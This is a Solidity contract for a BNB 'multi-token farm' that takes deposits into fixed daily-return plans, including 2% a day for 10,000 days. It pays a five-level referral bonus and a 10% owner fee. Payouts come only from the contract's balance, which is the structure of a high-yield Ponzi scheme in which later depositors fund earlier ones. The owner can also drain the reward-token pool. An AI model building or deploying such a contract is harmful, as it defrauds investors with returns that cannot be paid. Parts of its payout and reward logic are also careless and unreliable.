// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Utils.sol";

contract MultiTokenFarm is Ownable {
	using SafeMath for uint256;

	// TODO BEP reward token
	IERC20 public rewardToken;

	// uint256 constant public INVEST_MIN_AMOUNT = 5e16; // 0.05 bnb
	uint256 constant public INVEST_MIN_AMOUNT = 1e16; // 0.01 bnb
	uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
	uint256 constant public PROJECT_FEE = 100; // 10%
	uint256 constant public PERCENT_STEP = 5;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		// TODO BEP reward token
		uint256 earnedRewardToken;
	}

	mapping (address => User) internal users;

	bool public started;
	address payable public commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	// TODO BEP reward token
	event rewardTransfered(uint256 _amt, address _user);

	constructor(address payable wallet, address _rewardToken) {
		require(!isContract(wallet));
		commissionWallet = wallet;

        plans.push(Plan(10000, 20));
        plans.push(Plan(40, 40));
        plans.push(Plan(60, 35));
        plans.push(Plan(90, 30));

		// TODO BEP reward token
		rewardToken = IERC20(_rewardToken);
	}

	function invest(address referrer, uint8 plan) public payable {
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}

		require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		// TODO BEP reward token
		rewardToken.transfer(msg.sender, getRewardAmt(msg.value));
		users[msg.sender].earnedRewardToken = users[msg.sender].earnedRewardToken.add(getRewardAmt(msg.value));
		emit rewardTransfered(getRewardAmt(msg.value), msg.sender);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);

					//TODO accumulate RefBonus to totalRefBonus
					totalRefBonus = totalRefBonus.add(amount);

					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		payable(msg.sender).transfer(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	// TODO BEP reward token
	function getRewardAmt(uint256 _stakeAmt) public view returns(uint256 rewardAmt) {
		if (_stakeAmt <= 0.1 ether) { 								 //0.01BNB > X < 0.1BNB   --> 0.01 MULT
			rewardAmt = 0.01 ether;
		} else if (_stakeAmt > 0.1 ether && _stakeAmt <= 0.5 ether){ //0.1BNB > X < 0.5BNB   --> 0.05 MULT
			rewardAmt = 0.05 ether;
		} else if (_stakeAmt > 0.5 ether && _stakeAmt <= 1 ether) {  //0.5BNB > X < 1BNB   --> 0.2 MULT
			rewardAmt = 0.2 ether;
		} else if (_stakeAmt > 1 ether && _stakeAmt <= 5 ether) { 	 //1BNB > X < 5BNB   --> 2 MULT
			rewardAmt = 2 ether;
		} else if (_stakeAmt > 5 ether && _stakeAmt <= 10 ether) {   //5BNB > X < 10BNB   --> 5 MULT
			rewardAmt = 5 ether;
		} else if (_stakeAmt > 10 ether && _stakeAmt <= 15 ether) {  //10BNB > X < 15BNB   --> 10 MULT
			rewardAmt = 10 ether;
		} else if (_stakeAmt > 15 ether && _stakeAmt <= 40 ether) {  //15BNB > X < 40BNB   --> 25 MULT
			rewardAmt = 25 ether;
		} else if (rewardToken.balanceOf(address(this)) == 0) {
			rewardAmt = 0;
		} else {  													 //40BNB >   --> 50 MULT"        
			rewardAmt = 50 ether;
		}
	}
	function withdrawReward(uint256 _amt) onlyOwner public {
		require(rewardToken.balanceOf(address(this)) >= _amt, "Not enough reward token to withdraw");
		rewardToken.transfer(msg.sender, _amt);
	}
	function getUserRewardAmt(address _user) public view returns(uint256) {
		return users[_user].earnedRewardToken;
	}
}

